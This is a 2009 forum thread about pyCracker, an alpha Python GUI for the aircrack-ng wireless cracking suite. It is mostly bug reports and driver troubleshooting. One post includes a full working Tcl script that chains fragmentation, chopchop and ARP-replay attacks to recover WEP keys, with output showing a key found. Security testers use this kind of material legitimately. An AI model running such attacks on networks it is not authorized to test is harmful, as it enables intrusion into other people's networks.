---
title: "pyCracker - A GUI for aircrack-ng suit!"
date: 2009-01-25
forum: Programming Talk
---

### Post by Sprut1 on 2009-01-25
This is a program I've been working on. It bundles all the aircrack-ng programs into an highly functional GUI. This IS an alpha release and I expect several bugs, thats why I need help testing.

Google code page: [http://code.google.com/p/pycracker/](http://code.google.com/p/pycracker/)

For those who don't know what aircrack-ng is, can read about that on [http://www.aircrack-ng.org](http://www.aircrack-ng.org) or in wiemans how-to, here: [http://ubuntuforums.org/showthread.php?t=528276](http://ubuntuforums.org/showthread.php?t=528276) - in short they are applications used to sniff packages with a wireless network card and crack wireless access points. Remember that cracking other peoples networks are highly illegal and this should be used to test your own networks security only.

Okay so this is what you need:

- Python runtime
- wxPython (wxwidgets 2.8)
- aircrack-ng suit ([http://www.aircrack-ng.org](http://www.aircrack-ng.org))
- Patched networking drivers (read about this on [http://www.aircrack-ng.org](http://www.aircrack-ng.org))
- root access
- some available space for .cap files
- My program, see attachment.

To start the program enter a terminal and navigate to the folder where you unzip the application, then simply 

```
"sudo python pyCracker.py"
```

Which then should launch the application. Please refer to the read-me under Docs folder if there are any questions at this point, or post here.

Now simply go to "Networks" and select a network, then click crack. The aircrack-ng program will launch according to the IV count you define under "Setup" tab. Please use wiemans how-to to learn how the aircrack programs work, if I explain everything here the post will be extremely long.

If there are any errors/bugs (I expect there to be plenty) please post the following:

- Screenshot if possible (A picture can say a thousand words)
- /Logs/Debug.txt (This is logged by default, please don't turn off)
- Anything that is printed to the terminal of which the program was run.
- Otherwise just a comment on what was going on and what the results where when the error inflicted.

I would like to thank tturrisi, unutbu, minimammut for helping out so far and wieman for the great tutorial. Happy cracking all!

By the way, if any python experts look at my code, please give me pointers, I started learning python like 3 months ago :)

Edit: Smilies owned me.
Edit2: I'll add screenshots tomorrow, they are also available at wiemans tutorial if anyone want to see them.
Edit3: Added screenshots.


Changes:

13.3.2009
 - 0.0.7.1-alpha was uploaded to [http://code.google.com/p/pycracker/downloads/list](http://code.google.com/p/pycracker/downloads/list)
 - Removed the attached version as its outdated.

---

### Post by tturrisi on 2009-01-25
FYI, aircrack-ng-1.0-rc2 was released a few days ago.

---

### Post by Sprut1 on 2009-01-25
> **tturrisi said:**
> FYI, aircrack-ng-1.0-rc2 was released a few days ago.

Thanks for the information, I will look into the changes.

---

### Post by bvanaerde on 2009-01-26
This looks interesting! Going to try this in the weekend.

---

### Post by Sprut1 on 2009-01-26
> **bvanaerde said:**
> This looks interesting! Going to try this in the weekend.

Remember to check out wiemans thread and how to patch drivers on aircrack.org. Note that not all hardwares are supported.



Added screenshots.

---

### Post by bvanaerde on 2009-01-26
> **Sprut1 said:**
> ...how to patch drivers on aircrack.org. Note that not all hardwares are supported.
Yes, I'm aware of that. I've got an IPW2200, so it should work after patching the drivers.

---

### Post by tturrisi on 2009-01-26
1. I cannot put my adapter into monitor mode using the Monitor button.  Creating a managed device fails as well.

2. If I have my adapter in managed mode and launch the program, I can select a network to crack and my adapter automitacally goes into monitor mode.  This is good.  But the program fails.

Output in terminal"
```
# python pyCracker.py
lo        no wireless extensions.

eth1      no wireless extensions.

wifi0     no wireless extensions.

lo        no wireless extensions.

eth1      no wireless extensions.

wifi0     no wireless extensions.

# WHITESPACE HERE REMOVED TO POST IN THIS THREAD

 CH 11 ][ Elapsed: 3 mins ][ 2009-01-26 13:50                                  
                                                                               
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH E
                                                                               
 00:0F:B5:9F:DD:04   56 100     1895        0    0  11  54   WEP  WEP         8
                                                                               
 BSSID              STATION            PWR   Rate   Lost  Packets  Probe      
```

Debug.txt
```
[ New session ] 
18:45:41 | 1 | /Init | Loading completed in 0.43s 
18:45:41 | 2 | /Init | System: posix 
18:46:33 | 3 | /network-list | Retrieving networks... 
18:46:33 | 4 | /network-list | NOTIFY: A new network was found! 
18:46:45 | 5 | /cracker | New cracker initialized on w-interface wifi0 AP: 00:0F:B5:9F:DD:04 
18:46:47 | 6 | /monitor | Found 3 processes that could cause trouble. 
18:46:47 | 7 | /monitor | If airodump-ng, aireplay-ng or airtun-ng stops working after 
18:46:47 | 8 | /monitor | a short period of time, you may want to kill (some of) them! 
18:46:47 | 9 | /monitor | PID	Name 
18:46:47 | 10 | /monitor | 2630	dhclient3 
18:46:47 | 11 | /monitor | 3171	dhclient3 
18:46:47 | 12 | /monitor | 5595	dhclient3 
18:46:47 | 13 | /monitor | Interface	Chipset		Driver 
18:46:47 | 14 | /monitor | wifi0		Atheros		madwifi-ng 
18:46:47 | 15 | /monitor | ath0		Atheros		madwifi-ng VAP (parent: wifi0) (monitor mode enabled) 
18:46:52 | 16 | /dump | There are no active stations, waiting... 
18:46:57 | 17 | /dump | There are no active stations, waiting... 
18:47:02 | 18 | /dump | There are no active stations, waiting... 
18:47:07 | 19 | /dump | There are no active stations, waiting... 
18:47:12 | 20 | /dump | There are no active stations, waiting... 
18:47:17 | 21 | /dump | There are no active stations, waiting... 
```

3. The Stop button does not work for me.  To stop, I must select another network to crack and I get alerted that a crack is in progress...stop it...yes or no.

---

### Post by KIAaze on 2009-01-26
Cool! :)

I'm currently trying to get aircrack working again on my PC, but am having problems with the drivers (at least I think it's the drivers).
I managed to do it once, and now that I want to demonstrate it again it doesn't work anymore. :(

Will you implement an easy driver installation system as well? or at least injection testing?

---

### Post by Sprut1 on 2009-01-26
> **tturrisi said:**
> 1. I cannot put my adapter into monitor mode using the Monitor button.  Creating a managed device fails as well.

This is not yet available (I forgot to remove the menu, sorry about that). The reason for that being is that you can't yet start a cracker manually, without selecting one from the list. If you put an interface in monitor mode this list won't show as you cannot scan networks.

> **tturrisi said:**
> 
2. If I have my adapter in managed mode and launch the program, I can select a network to crack and my adapter automitacally goes into monitor mode.  This is good.  But the program fails.

Output in terminal"
```
# python pyCracker.py
lo        no wireless extensions.

eth1      no wireless extensions.

wifi0     no wireless extensions.

lo        no wireless extensions.

eth1      no wireless extensions.

wifi0     no wireless extensions.

# WHITESPACE HERE REMOVED TO POST IN THIS THREAD

 CH 11 ][ Elapsed: 3 mins ][ 2009-01-26 13:50                                  
                                                                               
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH E
                                                                               
 00:0F:B5:9F:DD:04   56 100     1895        0    0  11  54   WEP  WEP         8
                                                                               
 BSSID              STATION            PWR   Rate   Lost  Packets  Probe      
```

Debug.txt
```
[ New session ] 
18:45:41 | 1 | /Init | Loading completed in 0.43s 
18:45:41 | 2 | /Init | System: posix 
18:46:33 | 3 | /network-list | Retrieving networks... 
18:46:33 | 4 | /network-list | NOTIFY: A new network was found! 
18:46:45 | 5 | /cracker | New cracker initialized on w-interface wifi0 AP: 00:0F:B5:9F:DD:04 
18:46:47 | 6 | /monitor | Found 3 processes that could cause trouble. 
18:46:47 | 7 | /monitor | If airodump-ng, aireplay-ng or airtun-ng stops working after 
18:46:47 | 8 | /monitor | a short period of time, you may want to kill (some of) them! 
18:46:47 | 9 | /monitor | PID	Name 
18:46:47 | 10 | /monitor | 2630	dhclient3 
18:46:47 | 11 | /monitor | 3171	dhclient3 
18:46:47 | 12 | /monitor | 5595	dhclient3 
18:46:47 | 13 | /monitor | Interface	Chipset		Driver 
18:46:47 | 14 | /monitor | wifi0		Atheros		madwifi-ng 
18:46:47 | 15 | /monitor | ath0		Atheros		madwifi-ng VAP (parent: wifi0) (monitor mode enabled) 
18:46:52 | 16 | /dump | There are no active stations, waiting... 
18:46:57 | 17 | /dump | There are no active stations, waiting... 
18:47:02 | 18 | /dump | There are no active stations, waiting... 
18:47:07 | 19 | /dump | There are no active stations, waiting... 
18:47:12 | 20 | /dump | There are no active stations, waiting... 
18:47:17 | 21 | /dump | There are no active stations, waiting... 
```

Selecting a network from the list and start cracker from there is the preferred way at this time being, I can see that it worked great and there are actually so far no problems with my application. Simply you got a list of programs that already are using the interface and can (did) cause problems. Before using my application please stop network manager and look into the processes that were listed to you; "dhclient3". If this doesn't work please post back.

> **tturrisi said:**
> 
3. The Stop button does not work for me.  To stop, I must select another network to crack and I get alerted that a crack is in progress...stop it...yes or no.

This was caused by a bug in code and should be fixed with next release. Quitting the application should also stop cracking, you can check system manager to clarify this.

---

### Post by Sprut1 on 2009-01-26
> **KIAaze said:**
> Cool! :)

I'm currently trying to get aircrack working again on my PC, but am having problems with the drivers (at least I think it's the drivers).
I managed to do it once, and now that I want to demonstrate it again it doesn't work anymore. :(

Will you implement an easy driver installation system as well? or at least injection testing?

I don't think driver installation will every be a part of the program. Injection testing on the other hand will be implemented in near future.

---

### Post by KIAaze on 2009-01-26
> I don't think driver installation will every be a part of the program.
Well, it would have surprised me if it were. ^^
But it would have been great...

You should try to get your program into Backtrack. ;)
[http://www.remote-exploit.org/backtrack.html](http://www.remote-exploit.org/backtrack.html)

Here's another similar tool I tried to use to automate aircrack use:
[http://airoscript.aircrack-ng.org/](http://airoscript.aircrack-ng.org/)

---

### Post by Sprut1 on 2009-01-26
> **KIAaze said:**
> Well, it would have surprised me if it were. ^^
But it would have been great...

Yeah I'm sorry it's just a way to broad subject. Who knows, I might be bored someday...

> **KIAaze said:**
> 
You should try to get your program into Backtrack. ;)
[http://www.remote-exploit.org/backtrack.html](http://www.remote-exploit.org/backtrack.html)

First I should try to get a program that works, but thanks :D

> **KIAaze said:**
> 
Here's another similar tool I tried to use to automate aircrack use:
[http://airoscript.aircrack-ng.org/](http://airoscript.aircrack-ng.org/)

Thanks for the link, I have seen scripts like this before, I for one like the power of a graphical user interface even more. :)

---

### Post by tturrisi on 2009-01-26
1. I do not have network-manager installed at all, never did, never will.  IMHO it's a piece of buggy crapola.

2. dhclient should not interfere at all, if it does, then s/g else is bugged.  It can be loaded while I use aircrack or airoscript from a term w/ no problems.

I'll try killing it & retest.

---

### Post by ericjohn80 on 2009-01-26
I tried it but had the same error as listed above, problem...

I use a broadcom and have to use the command :
sudo airmon-ng start wlan0

(wlan0) being the broadcom card!!!

---

### Post by Sprut1 on 2009-01-26
> **tturrisi said:**
> 1. I do not have network-manager installed at all, never did, never will.  IMHO it's a piece of buggy crapola.

2. dhclient should not interfere at all, if it does, then s/g else is bugged.  It can be loaded while I use aircrack or airoscript from a term w/ no problems.

I'll try killing it & retest.

Okay then, well either way the messaged is printed from one of the aircrack-ng programs, I did a search and to me it looks like something is using the interface which causes the error. Try starting airodump-ng and do some deauths with aireplay-ng from the terminal (this is basically what my application tried to do when the messages appeared).

Please check this:
```
sudo airmon-ng check wifi0
```

I found a list of more or less relevant processes:
    * wpa_action
    * wpa_cli
    * wpa_supplicant
    * dhclient
    * dhclient3
    * knetworkmanager
    * network-manager. Process Name: NetworkManager
    * network-manager-gnome (is this the real process name?)
    * NetworkManagerDispatcher
    * RutilT (ralink NM)
    * netcfg2
    * netcfg
    * net-profiles 

Whether this is correct information I need expertise help to confirm.

> **ericjohn80 said:**
> I tried it but had the same error as listed above, problem...

I use a broadcom and have to use the command :
sudo airmon-ng start wlan0

(wlan0) being the broadcom card!!!

Please post all related output/error messages, that way I can try to identify the problem.

---

### Post by tturrisi on 2009-01-27
It is correct that some of those processes can interfere w/ airmon-ng.  However, it depends on the procedure used, i.e. what type of attack is being implemented.

It appears that the attack you are using requires another clent be connected to the wlan, so it can be deauthed, else the attack takes a very long time when no other clients are connected to the wlan.

If you ever implement the various attack types, which can be selected prior to pushing the attack button, then we'll see very fast cracking occurring.

For example, a script I use implements a fragmentation attack followed by a chop chop attack.  In this method, no other clients are necessary and the crack is fast.  And the dhclient need not be killed.

example:
```
d830:~/scripts/ws# wlanconfig ath0 destroy
d830:~/scripts/ws# wlanconfig ath0 create wlandev wifi0 wlanmode monitor
ath0
d830:~/scripts/ws# ifconfig ath0 up
d830:~/scripts/ws# ./ws.tcl 8724 ath0 11
Device MAC 06:1A:4D:34:66:92
AP MAC 00:0F:B5:9F:DD:04
Associated successfully.
Running fragmentation attack...
Running chopchop attack...
Listening for ARP packets...
Got keystream...
Injecting generated packet...
Packet capture started.
Starting crack...
Replaying ARP packets.
KEY FOUND! [ 30:B8:0E:72:81 ] 
Cleaning up...
Time taken: 158 seconds
d830:~/scripts/ws#
```

This is the tcl script, whick probably could esily be converted using python.
```
#!/usr/bin/tclsh

set essid "\"[join [lrange [split $argv] 0 end-2]]\""
set iface [lindex [split $argv] end-1]
set channel [lindex [split $argv] end]
exec iwconfig $iface channel $channel
set debug 0

if {$debug} {
	puts "Essid: $essid\nIface: $iface\nChannel: $channel"
}

proc unblock {channel} {
	fconfigure $channel -buffering none -blocking 0 
	return $channel
}

proc do_auth {essid iface} {	
	set assoc [open "|/usr/local/sbin/aireplay-ng -1 900 -e $essid $iface"]
	return [unblock $assoc]
}

proc check_auth {assoc} {
	set prevline ""
	while {[set curline [gets $assoc]] != ""} {
		if {$::debug} {puts $curline}
		if {[string match "*Association successful*" $curline]} {
			puts "Associated successfully."
			set ::authed 1			
		} elseif {[regexp {Using the device MAC \((.+?)\)} $curline tmp ::hmac]} {
			puts "Device MAC $::hmac"
		} elseif {[regexp {Found BSSID "(.+?)"} $curline tmp ::bmac]} {
			puts "AP MAC $::bmac"
		}
	}
}

proc do_chop {essid iface} {
	puts "Running chopchop attack..."
	set chop [open "|/usr/local/sbin/aireplay-ng -4 -F -h $::hmac -e $essid $iface" r+]
	return [unblock $chop]
}

proc do_frag {essid iface} {
	puts "Running fragmentation attack..."
	set frag [open "|/usr/local/sbin/aireplay-ng -5 -F -e $essid $iface" r+]
	return [unblock $frag]
}

proc check_gen {frag} {
	while {[set curline [gets $frag]] != ""} {
		if {$::debug} {puts $curline}
		if {[regexp -line {^Saving keystream in (.+?)$} $curline tmp filename]} {
			return $filename
		} elseif {[string match "Still nothing*" $curline]} {
			puts $frag "n\n"
			flush $frag
		}
	}
	return 0
}

proc make_packet {xor} {
	catch {exec packetforge-ng -0 -a $::bmac -h $::hmac -k 192.168.1.100 -l 192.168.1.101 -y $xor -w arp-request}
}

proc do_inj {iface essid} {
	set inj [open "|/usr/local/sbin/aireplay-ng -3 -r arp-request -e $essid -F $iface"]
	puts "Injecting generated packet..."
	return [unblock $inj]
}

proc do_arpinj {iface essid} {
	set inj [open "|/usr/local/sbin/aireplay-ng -3 -e $essid -F $iface -x 900"]
	puts "Listening for ARP packets..."
	return [unblock $inj]
}

proc check_arpinj {arpinj frag chop} {
	while {[set curline [gets $arpinj]] != ""} {
		if {$::debug} {puts $curline}
		if {!$::replaystarted && [regexp -line {^Read \d+ packets} $curline] && ![regexp {got 0 ARP requests} $curline]} {
			puts "Replaying ARP packets."
			catch {exec kill -9 [pid $frag]} tmp
			catch {exec kill -9 [pid $chop]} tmp
			catch {exec kill -9 [pid $::inj]} tmp
			set ::replaystarted 1
			return 1
		}
	}
	return 0
}

proc do_dump {iface chan} {
	puts "Packet capture started."
	set aero [open "|/usr/local/sbin/airodump-ng --channel $chan -w temp $iface"]
	return [unblock $aero]
}

proc do_crack {essid} {
	puts "Starting crack..."
	after 500
	set ac [open "|/usr/local/bin/aircrack-ng -z -q -e $essid -b $::bmac [pwd]/temp-01.cap"]
	return [unblock $ac]
}

proc check_crack {ac} {
	while {[set curline [gets $ac]] != ""} {
		if {$::debug} {puts $curline}
		if {[regexp -line {^KEY FOUND.+?$} $curline key]} {
			puts $key
			return 1
		}
	}
	return 0
}

proc do_cleanup {} {
	puts "Cleaning up..."
	eval file delete [glob *.cap]
	catch {eval file delete [glob *.xor]}
	file delete temp-01.txt
	file delete arp-request
}

set time [clock seconds]
set authstarted 0
set authed 0
set fragstarted 0
set fragged 0
set forged 0
set injecting 0
set airodump 0
set aircrack 0
set arpinjstarted 0
set finished 0
set replaystarted 0
set inj ""

while {true} {
	if {!$authstarted} {
		set assoc [do_auth $essid $iface]
		set authstarted 1
	}
	check_auth $assoc
	
	if {!$fragstarted && $authed} {
		set frag [do_frag $essid $iface]
		set chop [do_chop $essid $iface]
		set arpinj [do_arpinj $iface $essid]
		set fragstarted 1
		set arpinjstarted 1
	}

	if {$arpinjstarted} {
		set cur [check_arpinj $arpinj $frag $chop]
		if {!$injecting && $cur} {
			set injecting $cur
		}
	}

	if {$fragstarted && !$fragged && !$injecting} {
		if {[set xor [check_gen $frag]] != 0 || [set xor [check_gen $chop]] != 0} {
			puts "Got keystream..."
			set fragged 1
		}
	}

	if {$fragged && !$forged && !$injecting} {
		make_packet $xor
		set forged 1
	}

	if {$forged && !$injecting} {
		set inj [do_inj $iface $essid]
		set injecting 1
	}

	if {$injecting && !$airodump} {
		file delete temp-01.cap
		file delete temp-01.txt
		set dump [do_dump $iface $channel]
		set airodump 1
	}

	if {$airodump && !$aircrack && [file exist [pwd]/temp-01.cap]} {
		set ac [do_crack $essid]
		set aircrack 1
	}

	if {$aircrack} {
		set finished [check_crack $ac]
	}

	if {$finished} {
		do_cleanup
		catch {exec kill [pid $dump]} tmp
		catch {exec killall aireplay-ng} tmp
		break
	}
	after 10
}
puts "Time taken: [expr [clock seconds] - $time] seconds"
exit
```

---

### Post by Sprut1 on 2009-01-27
> **tturrisi said:**
> It is correct that some of those processes can interfere w/ airmon-ng.  However, it depends on the procedure used, i.e. what type of attack is being implemented.

It appears that the attack you are using requires another clent be connected to the wlan, so it can be deauthed, else the attack takes a very long time when no other clients are connected to the wlan.

As I haven't yet implemented the attacking setup only deauth is used on available clients, but there shouldn't be any deathing involved unless there are any clients connected, I'll check if there might be a bug in code. I wrote deauth first as it is an really easy attack to perform.

> **tturrisi said:**
> If you ever implement the various attack types, which can be selected prior to pushing the attack button, then we'll see very fast cracking occurring.

For example, a script I use implements a fragmentation attack followed by a chop chop attack.  In this method, no other clients are necessary and the crack is fast.  And the dhclient need not be killed.

My plan is to implement ALL attacks and make the process as automated and efficient as possible, I just want to make the basics to get some successful runs from others before I continue expanding. I see now that it might be necessary to make other attacks as well, for example like you say chop chop and fragmentation attacks for client-less access points.

In next release I'll look into:
- Injection test (which is 99% done)
- Chop chop attack
- Fragmentation attack
- ARP request replay attack
- packetforge-ng

Automated attacks and manual attacks will be implemented in the future. The "Attacks" tab should have all necessary settings for the various attacks and under "Packets" you should also be able to initiate attacks using the Stations list for example.

Bug fixes:
- Stop button not working (caused by obvious mistake in code)
- Possible bug with deauth attack while 0 clients are connected.

There should be various other changes as well. I'll upload this weekend.

---

### Post by antitude on 2009-01-30
Looks like a great GUI! It don't seem to work for me though... I get the following error message once I've clicked on "Crack":
/Read-packets  Error: The file or directory does not exist.

I'm a linux noob...so maybe I've missed something. What to do?
Oh, and I'm on an Eee PC 901, using Ubuntu 8.04.
Excuse my poor english. Thanks in advance!

---

### Post by Sprut1 on 2009-01-30
> **antitude said:**
> Looks like a great GUI! It don't seem to work for me though... I get the following error message once I've clicked on "Crack":
/Read-packets  Error: The file or directory does not exist.

I'm a linux noob...so maybe I've missed something. What to do?
Oh, and I'm on an Eee PC 901, using Ubuntu 8.04.
Excuse my poor english. Thanks in advance!

Thanks! The message you get is because pyCracker can't find your .txt file which has the information outputed from airodump-ng, this file reports what has been gathered in the .cap files. If the file doesn't exist airodump-ng hasn't created it yet, this is a result of no BSSID/Stations available. In the next release you will get an message in the BSSID/Stations list in pyCracker if this is the case.

Edit: Btw, I'm running late on the updates, Eclipse found out it didn't like Ubuntu 8.10, so I don't have a running IDE atm. In the meantime things will take somewhat longer time. I plan to upload sunday evening, if everything is working as it should, if not I'll wait until it does.

---

### Post by EXCiD3 on 2009-01-31
Want to say thanks for taking the initiative to make a GUI. This will help scare more people into actually securing their networks. I laughed when i heard that India was going around enforcing wifi security. The Indian police might find this handy! :P ;)

---

### Post by Bozzer on 2009-02-01
Also worth checking out if you have an Atheros wireless card is Russix ;)

---

### Post by Sprut1 on 2009-02-01
> **EXCiD3 said:**
> Want to say thanks for taking the initiative to make a GUI. This will help scare more people into actually securing their networks. I laughed when i heard that India was going around enforcing wifi security.

No problem, I just hope I don't fail midways :)

There are way too many networks that are unprotected, and by that I mean that doesn't use WPA2. I for one had no idea that WEP could be cracked that easily, I knew it was weaker than WPA1/2, but I had no idea it was this useless. About India, enforcing wifi security might be a bit drastic, but thinking about what *others* might do to/with your network is scary enough - most people just need to know the truth about what works and what doesn't.

> **EXCiD3 said:**
> 
The Indian police might find this handy! :P ;)

If there is anyone that at some point find this handy I will be satisfied :)

Now, concerning updates.
I have completed about everything I had planned for next release, but I haven't had time to test it properly, this will happen sometime this week. Instead of keep throwing releases out and getting a bunch of silly bugs reported back I'll test this version thoroughly. New features will be posted soon.

---

### Post by lipac on 2009-02-03
Hello,

I get following when I click on Networks tab:

```

Traceback (most recent call last):
  File "./pyCracker.py", line 445, in onPageChanged
    Modules.Functions.PopulateLstNetworks(self, int)
  File "/home/ivan/tools/pyCracker/Modules/Functions.py", line 99, in PopulateLstNetworks
    noise = words[7].replace("level=","")
IndexError: list index out of range

```

Tried both with rt73 and rtl8187 on Ubuntu Intrepid 8.10

---

### Post by Sprut1 on 2009-02-03
> **lipac said:**
> Hello,

I get following when I click on Networks tab:

```

Traceback (most recent call last):
  File "./pyCracker.py", line 445, in onPageChanged
    Modules.Functions.PopulateLstNetworks(self, int)
  File "/home/ivan/tools/pyCracker/Modules/Functions.py", line 99, in PopulateLstNetworks
    noise = words[7].replace("level=","")
IndexError: list index out of range

```

Tried both with rt73 and rtl8187 on Ubuntu Intrepid 8.10

This is caused by bad code with bad (=none) exception handling, it will definitely be fixed in next release, sorry about that.

I still haven't had time to test the application, I've been traveling (job issues) and had little time on my hands. At the moment I'm working on:

- Threading: All attacks are supposed to run on their own thread, this will exclude lag from the main application/GUI. This was noticed with Deauthing in versions < 0.0.6.13-alpha1.
- aireplay-ng: Completely implemented. Deauth, fake auth, arp replay, chop chop and fragmentation should all work. Interactive packet reply (-2) is not implemented.
- Various bugs fixed and many smaller features added.

Future features, for those interested:

- airdecloak-ng
- Tkiptun-ng
- Cracking WPA1/2 using password dictionaries.

Again, I apologize that the process is moving slow at this time being.

---

### Post by bkmo on 2009-02-11
I'm not trying to push you into releasing a new revision, but just want you to know that I am sure there are others like me anxiously awaiting a functional GUI.

Thanks, and keep up the good work

---

### Post by Sprut1 on 2009-02-12
> **bkmo said:**
> I'm not trying to push you into releasing a new revision, but just want you to know that I am sure there are others like me anxiously awaiting a functional GUI.

Thanks, and keep up the good work

Good thing you are interested!

As I've said before things are moving slow at the moment - I am traveling Monday through Thursday and have only the weekends to develop, this is only for a short period which is over in a few weeks. In the meantime I have only a few days per week where I can test my software. There are still some issues I need to fix before the next revision. I hope during this weekend, please be patient :)

---

### Post by bkmo on 2009-02-12
Like I said, I am not pushing you. I just wanted to let you know that what you are doing is much appreciated, and that there are probably many more than me waiting patiently for your fixes and additions. 

Thanks

---

### Post by UbuKunubi on 2009-02-12
I'm also keeping a close eye on how this develops!
It can take a lot of effort to step back into a complicated project to go the last mile, so i'd like to offer my encouragement!

Please keep up the good work.

---

### Post by Sprut1 on 2009-02-12
> **bkmo said:**
> Like I said, I am not pushing you. I just wanted to let you know that what you are doing is much appreciated, and that there are probably many more than me waiting patiently for your fixes and additions. 

Thanks

I'm glad there's people waiting for the next release, thank you for helping out with the development.

> **UbuKunubi said:**
> I'm also keeping a close eye on how this develops!
It can take a lot of effort to step back into a complicated project to go the last mile, so i'd like to offer my encouragement!

Please keep up the good work.

Great to hear! This is a somewhat special/complicated piece of software as it reads/writes to external programs which weren't made to work that way.

---

### Post by Sprut1 on 2009-02-14
By request I've created a project at google code and uploaded a new version - note that this version is barely tested as I haven't had time to do so yet. The new version is available here: [http://code.google.com/p/pycracker/](http://code.google.com/p/pycracker/)

Please report issues under the "Issues" tab, that way I can easily know whats wrong and start working on a fix. Thanks to all who have helped so far!

---

### Post by bogdanjasp on 2009-02-16
Hello everbody!
 
   Could someone try to explain me why i have this problems? I've put pictures in attach.

   I'm using an laptop with an Intel® PRO/Wireless 2200BG; i've manage to install aircrack-ng, python and patches and both pyCracker 0.0.6.13 and 0.0.6.42 are giving me the same error.

   What should i do ?

                                Thanks

---

### Post by mattoufoutu on 2009-02-17
I just tried your script, downloaded from your googlecode page, and i get many errors, here they are:

1) Script can't find the locker picture, because of a wrong path, it can be solved by editing main script, and in line 105 replacing ""/home/stigi/Development/Eclipse/pyCracker/Icons/Main.png" by simply "Icons/Main.png"
2) The script can't find any network, i tested it with an alfa500 (rtl8187 driver) and with a dlink usb dongle (rt73 patched drivers), and it shows nothing.
3) The script seems to use an app named "wlanconfig" wich can't be found, even in the apt deposits.
4) It doesn't seem to support VAP interfaces, as when i put my alfa in monitor mode, it only shows the parent interface (shows it in managed mode), but not the one in monitor mode.

I hope this will help you improve this script, as it is a really a nice GUI, and if it worked well on every point, i'm sure it could become a very great script.

PS: a nice thing to add to your script would be also to support many attacks types, like frag&forge, chopchop&forge, -p 0841, and so on. (i actually wander what is the attack used in your script)

Don't give up this project ;)

---

### Post by Sprut1 on 2009-02-17
> **bogdanjasp said:**
> Hello everbody!
 
   Could someone try to explain me why i have this problems? I've put pictures in attach.

   I'm using an laptop with an Intel® PRO/Wireless 2200BG; i've manage to install aircrack-ng, python and patches and both pyCracker 0.0.6.13 and 0.0.6.42 are giving me the same error.

   What should i do ? Thanks

> **mattoufoutu said:**
> I just tried your script, downloaded from your googlecode page, and i get many errors, here they are:

1) Script can't find the locker picture, because of a wrong path, it can be solved by editing main script, and in line 105 replacing ""/home/stigi/Development/Eclipse/pyCracker/Icons/Main.png" by simply "Icons/Main.png"
2) The script can't find any network, i tested it with an alfa500 (rtl8187 driver) and with a dlink usb dongle (rt73 patched drivers), and it shows nothing.
3) The script seems to use an app named "wlanconfig" wich can't be found, even in the apt deposits.
4) It doesn't seem to support VAP interfaces, as when i put my alfa in monitor mode, it only shows the parent interface (shows it in managed mode), but not the one in monitor mode.

I hope this will help you improve this script, as it is a really a nice GUI, and if it worked well on every point, i'm sure it could become a very great script.

PS: a nice thing to add to your script would be also to support many attacks types, like frag&forge, chopchop&forge, -p 0841, and so on. (i actually wander what is the attack used in your script)

Don't give up this project ;)

1. The GUI is generated from wxglade and the absolute paths weren't fixed before I zipped and uploaded, I'll remember that next time.

2/3 iwconfig and wlanconfig is used for general network/interfaces actions - I'll see if there are any python ways of doing this (I have no clue if there are).

4. Again the information is coming from "iwconfig", but I'll check this.

All attacks are supposed to work, I'm not guaranteeing that they are though ;)

Do me a big favor and report all future issues on the code.google.com project page - that way I can easily manage them.

---

### Post by bogdanjasp on 2009-02-18
Hi there!

 Thank's for giving the right code for the picture, i've manage to resolve it. But steel when i check refresh for searching networks, it find, but when i try to crack got the same: "/Read-Packets Error: No such file or directory".
 Is there any way to resolve this ?


                               Many thanks!

---

### Post by Sprut1 on 2009-02-18
> **bogdanjasp said:**
> Hi there!

 Thank's for giving the right code for the picture, i've manage to resolve it. But steel when i check refresh for searching networks, it find, but when i try to crack got the same: "/Read-Packets Error: No such file or directory".
 Is there any way to resolve this ?


                               Many thanks!

That means that the .txt report that's created alongside the .cap file isn't found - which means it hasn't been created or that the application is looking for the wrong file. I've had similar reports before, but never had the problem myself, I'll make better exception handling to rule out whats wrong. This will be resolved in the next release. Thanks!

---

### Post by bkmo on 2009-02-20
> **Sprut1 said:**
> 1. 
2/3 iwconfig and wlanconfig is used for general network/interfaces actions - I'll see if there are any python ways of doing this (I have no clue if there are).


When I execute wlanconfig in Ubuntu it asks if I want to install madwifi. I assume then that this is installed only if you have an atheros chipset. 

Bkmo

---

### Post by Sprut1 on 2009-02-21
> **bkmo said:**
> When I execute wlanconfig in Ubuntu it asks if I want to install madwifi. I assume then that this is installed only if you have an atheros chipset. 

Bkmo

If this is the case, I need someone to verify this, then I need to know how you manage your network interfaces. I thought wlanconfig was pre-installed and standard, but again, I need someone to verify this.

---

### Post by Gordon Bennett on 2009-02-21
> **bkmo said:**
> When I execute wlanconfig in Ubuntu it asks if I want to install madwifi. I assume then that this is installed only if you have an atheros chipset. 

Bkmo

That's normal - wlanconfig has been rolled into the madwifi package.

---

### Post by tturrisi on 2009-02-22
Update the wiki.
On Setup page it says, "Patching Drivers
Also, to successfully inject packages...".
It should say, "to successfully inject **packets**...".

---

### Post by tturrisi on 2009-02-22
I suggest modifying this section TO ALLOW multiple instances of cracking the same wlan, spawned in a new terminal because airplay does have certain known issues injecting w/ madwifi drivers.  Often, running a second airplay process gets injecting going at the desired rate.

> 	#nbNetworks
	def onNetworkRightClick(self, event):
		_selected = self.lstNetworks.GetNextItem(-1, wx.LIST_NEXT_ALL, wx.LIST_STATE_SELECTED)
		if _selected == -1:
			self.PopupMenu(self.mnuLstNetworksNS)
		else:
			self.PopupMenu(self.mnuLstNetworks)

	def onBtnNetRefresh(self, event):
		Interfaces = self.Network.GetInterfaces()
		Found = False
		for int in Interfaces:
			if Interfaces[int]["Mode"] == "Managed":
				Modules.Functions.PopulateLstNetworks(self, int)
				Found = True
		if Found != True:
			Modules.Functions.Debug(self, "/networks", "Couldn't find a valid interface, put one in managed mode.", "Error")
		
	def onBtnInit(self, event):
		if self.Cracker.IsRunning() == "false":
			_selected = self.lstNetworks.GetNextItem(-1, wx.LIST_NEXT_ALL, wx.LIST_STATE_SELECTED)
			if _selected == -1:
				Modules.Functions.Debug(self, "/init-cracker", "Select a network", "Red")
			else:
				timenow = time.strftime("%d%b%Y-%H:%M:%S", time.gmtime())
				path = "%s/Packages/%s" % (sys.path[0], timenow)
				#print path
				Modules.Aircracker.AirmonCheck(self) # Use True to kill all process
